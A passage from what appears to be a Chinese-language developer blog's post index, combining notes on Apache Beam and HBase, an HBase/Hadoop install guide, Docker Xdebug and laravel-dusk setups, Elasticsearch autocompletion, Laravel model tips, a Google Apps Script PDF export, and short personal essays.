Embarrassingly Parallel (資料可以良好的被拆分成多個組合)的資料處理任務很好用。\n目前提供分散式的後端支援：\nApache Apex Apache Flink Apache Samza Apache Spark Google Cloud Dataflow Hazelcast Jet 以及三種 sdk：Java、Python、GO\nPrograming concept Pipeline：單一 task 的稱呼，包含 reading =\u0026gt; transforming =\u0026gt; writing 的一系列動作 PCollection：每個 job 處理的 data set的稱呼，有 bounded（batch） 跟 unbounded（streaming） 的分別 PTransform: 表示 pipeline 中一個 job 的處理流程（步驟），包含1~n個 PCollection 作為 input，0~n 個 PCollection 作為 output 一個最單純的 pipeline 用圖形表示如下 Transforms 有幾種類型如下 name describe ParDo Use for general parallel processing, 需搭配DoFn使用 GroupByKey Processing collections of key-value pairs CoGroupByKey Join two or more key-value PCollections that have same key type, 用再多來源在描述同一件事情時 Combine Combining collections of elements or values in your data, 使用時必須要提供 combine function Flatten Merges multiple PCollection objects into a single logical PCollection, 用在相同 data type 的 PCollections Partition Splits a single PCollection into a fixed number of smaller collections, 用在相同 data type 的 PCollections Basic requirements Your function object must be serializable. Your function object must be thread-compatible, and be aware that the Beam SDKs are not thread-safe. 這邊簡單寫到這，官方文件寫的蠻好懂的，有空可以去細讀\nHbase 一個開源版的分散式資料庫，理論基礎為 BigTable 又可稱為開源版的 BigTable，在 Hadoop ecosystem 裡面擔任 data storage 的角色，使用 HDFS 實現 fault tolerance\n與 RDBMS 的比較 HBase RDBMS HBase is schema-less, it doesn\u0026rsquo;t have the concept of fixed columns schema; defines only column families. An RDBMS is governed by its schema, which describes the whole structure of tables. It is built for wide tables. HBase is horizontally scalable. It is thin and built for small tables. Hard to scale. No transactions are there in HBase. RDBMS is transactional. It has de-normalized data. It will have normalized data. It is good for semi-structured as well as structured data. It is good for structured data. 與 HDFS 的關係 HDFS HBase HDFS is a distributed file system suitable for storing large files. HBase is a database built on top of the HDFS. HDFS does not support fast individual record lookups. HBase provides fast lookups for larger tables. It provides high latency batch processing; no concept of batch processing. It provides low latency access to single rows from billions of records (Random access). It provides only sequential access of data. HBase internally uses Hash tables and provides random access, and it stores the data in indexed HDFS files for faster lookups. Data model terminology term description table 由多個 row 組成 row 由row key + column family 組成，依照字母排序，設計row key應盡量讓相似的 pattern 放一起 column 由 column qualifier 與 column family 組成, 使用 colon character 做定界符號 column family 物理上將 column 分群，因此在create table時須先設定且不易修改，每個 row 都有相同的 column family，但不一定每個 column 都會有資料（sparse） column qualifier 提供 column family index 的基礎，可以後設但不能輕易修改 cell 一個資料源的最小單位（atom），預設保留 3 個版本，column family + column qualifier + row + value + timestamp timestamp 作為版本識別使用，不指定的話使用當下時間，讀取時預設抓取最新版本 以圖片呈現他們的關係如下 Running mode standalone default mode run on local filesystem No HDFS HMaster daemon only Never use on production Single node Single process pseudo distributed Use HDFS or local filesystem Single node Multi process Recommend to use on production fully distributed Use only HDFS cluster Best way to use on production 安裝可參考我之前的記錄\nAvro 由 hadoop 之父創造的一種檔案格式，由於是 language-neutral 因此可以被多種語言處理，廣泛被用於 hadoop 體系，是一種效率很高的檔案格式\nCode Reference beam overview beam programing guide avro overview hbase overview hbase book Introduction to HBase Scheme Design.pdf ","permalink":"http://shachiku.life/2020/06/avro-to-hbase-using-apache-beam/","summary":"這真的蠻冷門的","title":"Avro to Hbase using Apache Beam"},{"contents":"忘記是在哪裡看過「基本選擇」這個概念，大意是一切行為背後三個「為什麼」的解答主要成因，在探索這件事情存在的過程可能會讓你成為一個懷疑主義者—他人口中難搞的人。意識到存在便能進行干涉，無所謂好不好，端視當下狀態如何。\n選擇確立之後現實世界不會因此改變但自己的世界可能會有變化—買東西時從想要變成需要；肚子餓時從吃麵變成吃麩質，這些細微的變化一點一滴地把自己推向把自己推向心中認為更好的存在。\n那該怎麼設定所謂的「目的」？\n一個比較容易的方法是做完決定後寫下預期成效，每隔一段時間檢視成果然後修改成效。成果檢視等於反思，預期成效給予方向，修改成效則是輔助手段，因為立下選擇時參考的對象也會不斷改變。\n","permalink":"http://shachiku.life/2020/05/murmur-3/","summary":"無題","title":"雜談（3）"},{"contents":"最近幫公司架 hbase，快速筆記一下相關設定，這邊用ubuntu 1804\nhadoop 這裡只有用到他的 hdfs\nprerequirements sudo apt update sudo apt install openjdk-8-jdk-headless # setup hadoop user sudo adduser hadoop su - hadoop ssh-keygen -t rsa -P \u0026#39;\u0026#39; -f ~/.ssh/id_rsa cat ~/.ssh/id_rsa.pub \u0026gt;\u0026gt; ~/.ssh/authorized_keys chmod 0600 ~/.ssh/authorized_keys download hadoop # https://hadoop.apache.org/releases.html wget http://ftp.twaren.net/Unix/Web/apache/hadoop/common/hadoop-3.2.1/hadoop-3.2.1.tar.gz tar -zxvf hadoop-3.2.1.tar.gz sudo mv hadoop-3.2.1 /opt/hadoop setup env in ~/.bashrc export HADOOP_HOME=/opt/hadoop export HADOOP_INSTALL=$HADOOP_HOME export HADOOP_MAPRED_HOME=$HADOOP_HOME export HADOOP_COMMON_HOME=$HADOOP_HOME export HADOOP_HDFS_HOME=$HADOOP_HOME export YARN_HOME=$HADOOP_HOME export HADOOP_COMMON_LIB_NATIVE_DIR=$HADOOP_HOME/lib/native export HBASE_HOME=/opt/hbase export PATH=$PATH:$HADOOP_HOME/sbin:$HADOOP_HOME/bin:$HBASE_HOME/bin file configurations $HADOOP_HOME/etc/hadoop/hadoop-env.sh # find and replace export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/ export HADOOP_OPTS=\u0026#34;$HADOOP_OPTS -Djava.library.path=$HADOOP_HOME/lib/native\u0026#34; $HADOOP_HOME/etc/hadoop/core-site.xml \u0026lt;configuration\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;fs.default.name\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;hdfs://localhost:9000\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/configuration\u0026gt; $HADOOP_HOME/etc/hadoop/hdfs-site.xml \u0026lt;configuration\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;dfs.replication\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;1\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;dfs.namenode.name.dir\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;file:///opt/hadoop/nodes/hdfs/namenode\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;dfs.datanode.data.dir\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;file:///opt/hadoop/nodes/hdfs/datanode\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/configuration\u0026gt; format node cd $HADOOP_HOME/etc/hadoop \u0026amp;\u0026amp; hdfs namenode -format start hdfs $HADOOP_HOME/sbin/start-dfs.sh hbase 啟動模式比較 模式 hdfs production worker standalone - don\u0026rsquo;t do that single node single process pseudo distributed optional not recommend single node multi process fully distributed required ok multi node multi process 使用 fully distributed 模式時建議 zookeeper 也要獨立一台機器提供服務\ndownload \u0026amp; install cd # https://hbase.apache.org/downloads.html wget http://ftp.twaren.net/Unix/Web/apache/hbase/2.2.4/hbase-2.2.4-bin.tar.gz tar -zxvf hbase-2.2.4-bin.tar.gz sudo mv hbase-2.2.4 /opt/hbase cd /opt/hbase mkdir zookeeperdata file configurations(這邊以 pseudo distributed 為例) hbase-env.sh export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/ export HBASE_MANAGES_ZK=true # 預設 localhost, 如果要做 fully-distributed 的話修改這份，移除localhost並設定其他regions export HBASE_REGIONSERVERS=${HBASE_HOME}/conf/regionservers hbase-site.xml \u0026lt;configuration\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hbase.rootdir\u0026lt;/name\u0026gt; \u0026lt;!-- 8020 is ok, set to namenode position --\u0026gt; \u0026lt;value\u0026gt;hdfs://localhost:9000/hbase\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hbase.cluster.distributed\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;true\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hbase.zookeeper.quorum\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;localhost\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;dfs.replication\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;1\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hbase.zookeeper.property.clientPort\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;2181\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hbase.zookeeper.property.dataDir\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;/opt/hbase/zookeeperdata\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!-- standalone mode 時設定, 禁用hflush, hsync --\u0026gt; \u0026lt;!-- 這參數很怪，官網上說使用 hdfs 時不用設定，但我用的版本需要設定，可能跟hbase、hadoop相依性有關 --\u0026gt; \u0026lt;!-- \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hbase.unsafe.stream.capability.enforce\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;false\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; --\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;zookeeper.znode.parent\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;/hbase\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!-- prevent buffer overrun error --\u0026gt; \u0026lt;!-- @see https://docs.cloudera.com/runtime/7.1.0/troubleshooting-hbase/topics/hbase-thrift-server-crashes.html --\u0026gt; \u0026lt;!-- 有開下面這些參數的話接 thrift 的 client 也要特別指定 --\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hbase.regionserver.thrift.framed\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;true\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;!-- equals size per row if use batch --\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hbase.regionserver.thrift.framed.max_frame_size_in_mb\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;2\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;property\u0026gt; \u0026lt;name\u0026gt;hbase.regionserver.thrift.compact\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;true\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; \u0026lt;/configuration\u0026gt; up \u0026amp; running $HADOOP_HOME/sbin/start-dfs.sh $HBASE_HOME/bin/start-hbase.sh # 要串接 thrift client 的話跑下面的指令 $HBASE_HOME/bin/hbase-daemon.sh start thrift -c -f -threadedselector 下面是比較有關的 port port number usage 9870 Hadoop web ui 9864 namenode web ui 9000/8020 hdfs namenode 9090 thrift server api 9095 thrift server web ui 主要查看 9870 以及 9095 就能確定 hbase 能不能正常串接\nReference https://hbase.apache.org/book.html\n","permalink":"http://shachiku.life/2020/05/hbase-installation/","summary":"hbase only","title":"安裝 Hbase"},{"contents":"當我們在評價一件人／事／物時，評的通常是自身經驗而非個體本身，這種狀況隨著間隔時間越長越明顯，就跟旅遊時旅館要越住越好一樣，留在腦袋的總是失去前最極端的部分。\n而同一件個體的評價在不同的時機也會有所不同—肚子的飢餓程度會影響一間餐廳的料理美味程度；面試當下的表現會影響錄取與否，在這樣的基礎上可以理解說話的時機重要性遠大於說話的內容，以及所謂的客觀都是比較出來的—十個觀點裡有一個比較符合自身當時擁有的經驗的話它就是客觀。\n然而實際上評價的過程更多是先射箭再畫靶，這時比的是姿勢、聲音、速度、還有靶畫得好不好看，這幾項都做得好的就能獲得觀眾，做得越好獲得越多觀眾。\n至於命中率？都是100%，就不用比了。\n","permalink":"http://shachiku.life/2020/05/murmur-2/","summary":"關於同溫層","title":"雜談（2）"},{"contents":"Dockerfile 這裡只列 php 相關的\nFROM centos:8 ENV TZ=Asia/Taipei RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime \u0026amp;\u0026amp; echo $TZ \u0026gt; /etc/timezone RUN yum -y install epel-release \u0026amp;\u0026amp; php \u0026amp;\u0026amp; php-pecl-xdebug RUN echo \u0026#34;xdebug.remote_enable=1\u0026#34; \u0026gt;\u0026gt; /etc/php.d/15-xdebug.ini \u0026amp;\u0026amp; \\ echo \u0026#34;xdebug.remote_port=9000\u0026#34; \u0026gt;\u0026gt; /etc/php.d/15-xdebug.ini \u0026amp;\u0026amp; \\ echo \u0026#34;xdebug.remote_autostart=1\u0026#34; \u0026gt;\u0026gt; /etc/php.d/15-xdebug.ini \u0026amp;\u0026amp; \\ echo \u0026#34;xdebug.remote_connect_back=0\u0026#34; \u0026gt;\u0026gt; /etc/php.d/15-xdebug.ini \u0026amp;\u0026amp; \\ echo \u0026#34;xdebug.remote_handler=dbgp\u0026#34; \u0026gt;\u0026gt; /etc/php.d/15-xdebug.ini \u0026amp;\u0026amp; \\ echo \u0026#34;xdebug.max_nesting_level=250\u0026#34; \u0026gt;\u0026gt; /etc/php.d/15-xdebug.ini \u0026amp;\u0026amp; \\ echo \u0026#39;xdebug.remote_log=\u0026#34;/var/log/xdebug/php71-xdebug.log\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/php.d/15-xdebug.ini \u0026amp;\u0026amp; \\ echo \u0026#34;xdebug.remote_host=docker.for.mac.localhost\u0026#34; \u0026gt;\u0026gt; /etc/php.d/15-xdebug.ini \u0026amp;\u0026amp; \\ echo \u0026#34;xdebug.idekey=docker\u0026#34; \u0026gt;\u0026gt; /etc/php.d/15-xdebug.ini EXPOSE 22 80 443 CMD [\u0026#34;/usr/sbin/init\u0026#34;] vscode launch.json { \u0026#34;folders\u0026#34;: [ { \u0026#34;path\u0026#34;: \u0026#34;/path/to/local/documentroot\u0026#34; } ], \u0026#34;settings\u0026#34;: {}, \u0026#34;launch\u0026#34;: { \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;php xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9000, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/path/to/remote/documentroot\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } }, { \u0026#34;name\u0026#34;: \u0026#34;Launch currently php script\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;program\u0026#34;: \u0026#34;${file}\u0026#34;, \u0026#34;cwd\u0026#34;: \u0026#34;${fileDirname}\u0026#34;, \u0026#34;port\u0026#34;: 9000 } ], \u0026#34;compounds\u0026#34;: [] } } 以上\n","permalink":"http://shachiku.life/2020/05/docker-vscode-xdebug/","summary":"記錄一下比較好 copy-paste","title":"在 vscode 中設定 docker xdebug"},{"contents":"function doGet() { exportAsPDF(pdfName); } function exportBlob(blob, fileName) { blob = blob.setName(fileName) var folderId = \u0026#39;your-google-drive-folder-id\u0026#39;; var pdfFile = DriveApp.getFolderById(folderId).createFile(blob) } function exportAsPDF(name) { var SpreadSheet = SpreadsheetApp.openById(\u0026#39;your-id\u0026#39;) var Sheet = SpreadSheet.getSheetByName(name) var lastDataRowNumber = Sheet.getLastRow(); var range = Sheet.getRange(\u0026#34;A1:F\u0026#34; + lastDataRowNumber); var blob = getAsBlob(SpreadSheet.getUrl(), Sheet, range) exportBlob(blob, name) } function getAsBlob(url, sheet, range) { var rangeParam = \u0026#39;\u0026#39; var sheetParam = \u0026#39;\u0026#39; if(range){ // data row-col rangeParam = \u0026#39;\u0026amp;r1=\u0026#39; + (range.getRow() - 1) + \u0026#39;\u0026amp;r2=\u0026#39; + range.getLastRow() + \u0026#39;\u0026amp;c1=\u0026#39; + (range.getColumn() - 1) + \u0026#39;\u0026amp;c2=\u0026#39; + range.getLastColumn() } if (sheet) { // specific tab sheetParam = \u0026#39;\u0026amp;gid=\u0026#39; + sheet.getSheetId() } var exportUrl = url.replace(/\\/edit.*$/, \u0026#39;\u0026#39;) + \u0026#39;/export?exportFormat=pdf\u0026amp;format=pdf\u0026#39; + \u0026#39;\u0026amp;size=LETTER\u0026#39; + \u0026#39;\u0026amp;portrait=true\u0026#39; + \u0026#39;\u0026amp;fitw=true\u0026#39; + \u0026#39;\u0026amp;top_margin=0.75\u0026#39; + \u0026#39;\u0026amp;bottom_margin=0.75\u0026#39; + \u0026#39;\u0026amp;left_margin=0.7\u0026#39; + \u0026#39;\u0026amp;right_margin=0.7\u0026#39; + \u0026#39;\u0026amp;sheetnames=false\u0026amp;printtitle=false\u0026#39; + \u0026#39;\u0026amp;pagenum=false\u0026#39; + \u0026#39;\u0026amp;gridlines=true\u0026#39; + \u0026#39;\u0026amp;fzr=FALSE\u0026#39; + sheetParam + rangeParam var response = UrlFetchApp.fetch(exportUrl, { headers: { Authorization: \u0026#39;Bearer \u0026#39; + ScriptApp.getOAuthToken(), }, }) return response.getBlob() } ","permalink":"http://shachiku.life/2020/05/save-gsheet-as-pdf-to-google-drive/","summary":"感覺很有機會用就紀錄在這","title":"轉存 gsheet 成 pdf 並存入 google drive"},{"contents":"聰明的人腦中會把事情概念化（又可以說是圖像化或標準化），在學新東西的時候會把這些概念交互套用，形成新的概念，如此一來就能善用經驗進行學習，提高學習速率。\n在理解這層後對於所謂「保持初學者心態」這句話能有更深層的理解：即為「保持好奇心」，不是拿掉假設。\n難怪有種說法是「一直在強調學習的地方不要待太久」，因為好奇心這種東西應為發自內心產生，不斷被強調會讓人感覺疲憊，進而失去學習的動力，畢竟皮球踢久了也是要充氣的。\n","permalink":"http://shachiku.life/2020/04/murmur-1/","summary":"關於學習","title":"雜談（1）"},{"contents":"最近幫公司的搜尋實現自動完成功能，筆記一下\n自動完成直覺想到的關聯是「建議」以及「打字即呈現」，在 Elasticsearch 官方文件找的話會有Suggester、search as you type等關鍵字，以下分別說明兩者設定方式與差異\n這裡假設已經有安裝 ik 分詞器，還沒裝的可以餐考 我之前的文章\n設定方式 Suggester 官方提到共有四種類型如下\n名稱 描述 Term 用 edit distance 為算法基礎（顧名思義，某個字詞改變多少字元就能轉變為另個字詞），基於 analyze 過的單一 term 給予建議，不考慮 term 之間的關係。 Phrase 基於前者的基礎上考慮其關係，通常能提供更符合語意的結果。 Completion 針對 auto completion 的應用場景，其原理是將 token 編碼成 FST 後放在索引裡，由於是在 memory 因此回應速度很快，不過因其資料結構限制所以只能做 prefix 查詢 Context 是前者的進階使用，由於自動完成有時需要考慮情境（比如輸入 star 跑出 coffee，因為 starbuck 的存在）而出現的類型 這邊只介紹 Completion Suggester 的部分\nset mapping PUT \u0026lt;index\u0026gt; { \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34; : { \u0026#34;suggest\u0026#34; : { \u0026#34;type\u0026#34; : \u0026#34;completion\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_max_word\u0026#34; }, \u0026#34;title\u0026#34; : { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34; } } } } add data to suggest PUT \u0026lt;index\u0026gt;/_doc/1?refresh { \u0026#34;suggest\u0026#34; : { \u0026#34;input\u0026#34;: [ \u0026#34;甲狀腺腫大\u0026#34;, \u0026#34;甲狀腺凸眼症\u0026#34; ], } } get completion suggest POST \u0026lt;index\u0026gt;/_search?pretty { \u0026#34;suggest\u0026#34;: { \u0026#34;_doc\u0026#34; : { \u0026#34;prefix\u0026#34; : \u0026#34;甲\u0026#34;, \u0026#34;completion\u0026#34; : { \u0026#34;field\u0026#34; : \u0026#34;suggest\u0026#34; } } } } ##### response ##### { ... \u0026#34;suggest\u0026#34;: { \u0026#34;_doc\u0026#34; : [ { ... \u0026#34;options\u0026#34; : [ { \u0026#34;text\u0026#34; : \u0026#34;甲狀腺腫大\u0026#34;, \u0026#34;_index\u0026#34;: \u0026#34;music\u0026#34;, \u0026#34;_type\u0026#34;: \u0026#34;_doc\u0026#34;, \u0026#34;_id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;_score\u0026#34;: 1.0, \u0026#34;_source\u0026#34;: { \u0026#34;suggest\u0026#34;: [\u0026#34;甲狀腺腫大\u0026#34;, \u0026#34;甲狀腺凸眼症\u0026#34;] } } ] } ] } } 可以直接拿 _source 裡面的東西或是 text 作為 api 回傳的資料\nsearch_as_you_type 這是 7.2 之後才推出的欄位，使用 ngram 為基礎並打造的自動完成 field type，因此可以做到 infix 自動完成。\n搜尋 edge_ngram auto completion elasticsearch或是參考我的 Reference 可以知道 7.2 之前的版本大概都是怎麼完成 infix 的\nset mapping PUT \u0026lt;index\u0026gt; { \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34; : { \u0026#34;completion_field\u0026#34; : { \u0026#34;type\u0026#34; : \u0026#34;search_as_you_type\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_max_word\u0026#34; } } } } update index PUT \u0026lt;index\u0026gt;/_doc/1?refresh { \u0026#34;completion_field\u0026#34;: \u0026#34;甲狀腺腫大\u0026#34; } PUT \u0026lt;index\u0026gt;/_doc/2?refresh { \u0026#34;completion_field\u0026#34;: \u0026#34;甲狀腺凸眼症\u0026#34; } get result GET my_index/_search { \u0026#34;_source\u0026#34;: [\u0026#34;completion_field\u0026#34;], \u0026#34;query\u0026#34;: { \u0026#34;multi_match\u0026#34;: { \u0026#34;query\u0026#34;: \u0026#34;甲狀\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;best_fields\u0026#34;, # 按照有對應到的順序計算 \u0026#34;fields\u0026#34;: [ \u0026#34;completion_field\u0026#34; ] } } } ##### response ##### { ... \u0026#34;hits\u0026#34; : { ... \u0026#34;hits\u0026#34; : [ { \u0026#34;_index\u0026#34; : \u0026#34;completion_field\u0026#34;, \u0026#34;_type\u0026#34; : \u0026#34;_doc\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;_score\u0026#34; : 0.8630463, \u0026#34;_source\u0026#34; : { \u0026#34;completion_field\u0026#34; : \u0026#34;甲狀腺腫大\u0026#34; } }, { \u0026#34;_index\u0026#34; : \u0026#34;completion_field\u0026#34;, \u0026#34;_type\u0026#34; : \u0026#34;_doc\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;_score\u0026#34; : 0.8630463, \u0026#34;_source\u0026#34; : { \u0026#34;completion_field\u0026#34; : \u0026#34;甲狀腺凸眼症\u0026#34; } } ] } } _source 裡面的就是結果\n呈現結果示意圖 補充： analyzer 是什麼 Analyzer = Character Filter + Tokenizer + Token Filter\n名稱 簡介 Character Filter 針對原始文件進行處理，例如：去除HTML tag，一個 analyzer 可設定多個 char_filter Tokenizer 將前者的結果依據規則切分 token，比如以空白切分的 whitespace，必須要有一個 tokenizer Token Filter 將前者個結果進行增修（stop、lowercase、synonym\u0026hellip;），但不可移動其位置，可設定多個 filter Reference elasticsearch suggesters FST 深入剖析 elasticsearch 7.0 breaking changes how-to-wisely-combine-shingles-and-edgengram-to-provide-flexible-full-text-search analyzer-anatomy ","permalink":"http://shachiku.life/2020/04/setup-elasticsearch-autocompletion/","summary":"使用 elasticsearch 7.6.2","title":"設定 Elasticsearch 自動完成"},{"contents":"bind vs singleton bind for reusable class or object\nsingleton need only one instance through your application call\nexample\n\u0026lt;?php class TestClass { protected $value = 0; public function increase() { $this-\u0026gt;value++; return $this-\u0026gt;value; } } ### $app-\u0026gt;bind(\u0026#39;klass1\u0026#39;, TestClass::class); $app-\u0026gt;singleton(\u0026#39;klass2\u0026#39;, TestClass::class); ### app(\u0026#39;klass1\u0026#39;)-\u0026gt;increase(); // 1 app(\u0026#39;klass1\u0026#39;)-\u0026gt;increase(); // 1 app(\u0026#39;klass1\u0026#39;)-\u0026gt;increase(); // 1 --- app(\u0026#39;klass2\u0026#39;)-\u0026gt;increase(); // 1 app(\u0026#39;klass2\u0026#39;)-\u0026gt;increase(); // 2 app(\u0026#39;klass2\u0026#39;)-\u0026gt;increase(); // 3 extra information Facade makes you easily use your service with singleton because of resolveFacadeInstance, if you want to use it with bind you can call clearResolvedInstance in your facade.\nexample\n\u0026lt;?php protected static function getFacadeAccessor() { self::clearResolvedInstance(YourService::class); return YourService::class; } ","permalink":"http://shachiku.life/2020/03/difference-between-bind-and-singleton/","summary":"just note it","title":"Difference Between Bind and Singleton"},{"contents":"最近遇到一個怪問題，用 laravel 時如果指定 $primaryKey 為其他非 auto-increment 的值時必需同時指定$keyType跟$incrementing才能 model 在使用時正常\n比如說主鍵是 uuid 時要做以下設定才能正確執行，少一個都不能 work\n\u0026lt;?php $primaryKey = \u0026#39;uuid\u0026#39;; $keyType = \u0026#39;string\u0026#39;; $incrementing = false; 追了一下 source code 終於理解原因，下面說明存取 model 物件時到底這些欄位對它的影響\n存值 Model.php 在這支約 L682 的地方有說明如果設定上有 $incrementing 的時候會使用PDO::lastInsertId來取的最後 insert 的 id\n\u0026lt;?php // If the model has an incrementing key, we can use the \u0026#34;insertGetId\u0026#34; method on // the query builder, which will give us back the final inserted ID for this // table from the database. Not all tables have to be incrementing though. $attributes = $this-\u0026gt;getAttributes(); if ($this-\u0026gt;getIncrementing()) { $this-\u0026gt;insertAndSetId($query, $attributes); } 該函數在 mysql 時是使用LAST_INSERT_ID來做，根據mysql官方文件對該函數的說明可得知不管有無指定參數，回傳型別都會是 int，取回的欄位都是 auto_increment 的結果\nWith no argument, LAST_INSERT_ID() returns a BIGINT UNSIGNED (64-bit) value representing the first automatically generated value successfully inserted for an AUTO_INCREMENT column as a result of the most recently executed INSERT statement. The value of LAST_INSERT_ID() remains unchanged if no rows are successfully inserted. With an argument, LAST_INSERT_ID() returns an unsigned integer. 因此只設定$keyType以及$primaryKey在 model 新增時取回的 id 就不會是預期的值，必須加上$incrementing才能正確取得回傳值\n取值 model 在回傳的時候會去查看$casts裡面的東西並把它mapping起來作為回傳的 attributes，而在使用到的 Traits 裡面的裡面有去特別檢查$incrementing的設定，程式碼如下\nHasAttributes.php \u0026lt;?php public function getCasts() { if ($this-\u0026gt;getIncrementing()) { return array_merge([$this-\u0026gt;getKeyName() =\u0026gt; $this-\u0026gt;getKeyType()], $this-\u0026gt;casts); } return $this-\u0026gt;casts; } 因此在單純設定$keyType和$primaryKey時取值是不會有問題的\n結論 如果主 key 不是 laravel 預設型別，一定要同時設定上面提到的三個屬性才能確保 model 能正常 work\n","permalink":"http://shachiku.life/2020/02/laravel-model-incrementing-detail/","summary":"trace code 筆記","title":"Laravel Model 使用非預設主鍵"},{"contents":"最近因為要還債不得不寫測試，所以有了這篇文章\nlaravel-dusk是 laravel 官方推出的瀏覽器測試框架，\u0008整合了 selenium 以利進行各種奇形怪狀的測試\n進入主題 我們的開發環境是一個 nginx + php 的 image 作為 base container，nginx 設定不同的 server_name 把 request 導到不同的專案\n這邊使用的是 standalone 的架設方式，因為原本的 docker 上沒有跑瀏覽器測試的需求\n關鍵是要讓 selenium 可以連到專案\ndocker-compose.yml 下面列的都是 docker-compose.yml 使用時記得加上 -f 或改名\ndevelop-env.yml version: \u0026#34;3.7\u0026#34; services: container_name: local_dev image: your-dev-image:version command: [\u0026#34;/usr/sbin/init\u0026#34;] ports: - \u0026#34;80:80\u0026#34; - \u0026#34;443:443\u0026#34; privileged: true networks: mynetwork: # 要給固定 ip ipv4_address: 172.28.0.2 standalone-chrome.yml version: \u0026#34;3.7\u0026#34; services: chrome: container_name: local_selenium-chrome image: selenium/standalone-chrome:3.141.59 ports: - \u0026#34;4444:4444\u0026#34; volumes: - /dev/shm:/dev/shm extra_hosts: # 這裡要指定這個 container 應該要看到的 hostname，看你的 nginx 設定 - \u0026#34;local-project.dev:172.28.0.2\u0026#34; networks: default: external: name: mynetwork 下面列出 laravel-dusk 要做的事\nlaravel-dusk 這邊是說開發環境\nDuskTestCase.php \u0026lt;?php /** * Create the RemoteWebDriver instance. * * @return \\Facebook\\WebDriver\\Remote\\RemoteWebDriver */ protected function driver() { $options = (new ChromeOptions)-\u0026gt;addArguments([ \u0026#39;--disable-gpu\u0026#39;, \u0026#39;--headless\u0026#39;, ]); // 這邊要能讓 dusk 連的到 standalone-chrome return RemoteWebDriver::create( \u0026#39;http://chrome:4444/wd/hub\u0026#39;, DesiredCapabilities::chrome()-\u0026gt;setCapability( ChromeOptions::CAPABILITY, $options ) ); } .env.dusk.local 獨立一個環境給 dusk 跑的時候吃，要注意的是 APP_URL\n# 這邊是讓 standalone-chrome 可以連的到的專案 host APP_URL=http://local-project.dev 成果 都設定成功的話直接下 php artisan dusk 應該會看到畫面如下 Reference laravel-dusk official doc ","permalink":"http://shachiku.life/2020/01/laravel-dusk-on-docker/","summary":"自己挖的洞自己填","title":"在 docker 上跑 laravel-dusk"},{"contents":"改 wording 這種別人說了算的東西，就應該把責任推給別人，所以就有了這篇文章\ngoogle 有個東西叫 google app script可以在他旗下的產品裡寫外掛，這裡有份tutorial提供參考\n直接切入主題 參考以下步驟\n建立sheet 進入 script editor write code\n只需要你的 sheet id 即可\nhttps://docs.google.com/spreadsheets/d/{your-sheet-id}/edit#gid=0 google app script有幾種類型的 script, 這裡用 web app\n// 發布後會有個 uri, get 他就進這邊 function doGet(e) { // init sheet object const qs = e.parameter.tab // https://webappuri/?tab=123, 